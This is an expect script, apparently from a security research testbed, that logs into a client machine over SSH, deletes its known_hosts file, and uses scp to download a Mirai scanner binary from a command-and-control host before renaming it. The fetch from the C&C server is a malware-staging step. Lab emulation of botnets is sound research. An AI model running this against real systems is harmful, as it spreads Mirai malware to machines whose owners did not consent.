#!/usr/bin/expect -f
set delKnownHosts [lindex $argv 0]
set client_ip [lindex $argv 1]
set username [lindex $argv 2]
set password [lindex $argv 3]
set path [lindex $argv 4]
set cnc_ip [lindex $argv 5]
set cnc_user [lindex $argv 6]
set cnc_pass [lindex $argv 7]
set cnc_path [lindex $argv 8]

set mirai_debug_path "Mirai-Source-Code/mirai/debug"
set mirai_scan "mirai_scan"
set mirai "mirai"
set configure_path "CREME/scripts/configuration/prepared_files/malicious_client"

set timeout 120

# SSH connection
spawn /bin/bash $delKnownHosts
send "exit\r"
spawn ssh $username@$client_ip
expect "*continue connecting (yes/no*)? "
send "yes\r"
expect " password: "
send "$password\r"

# download malicious mirai file from cnc
expect "*:~# "
send "rm ~/.ssh/known_hosts\r"
expect "*:~# "
send "scp $cnc_user@$cnc_ip:$cnc_path/$mirai_debug_path/$mirai_scan.dbg  $path\r"
expect "*continue connecting (yes/no*)? "
send "yes\r"
expect " password: "
send "$cnc_pass\r"
# change mirai name
expect "*:~# "
send "mv $path/$mirai_scan.dbg $path/$mirai.dbg\r"

# exit
expect "*:~# "
send "exit\r"
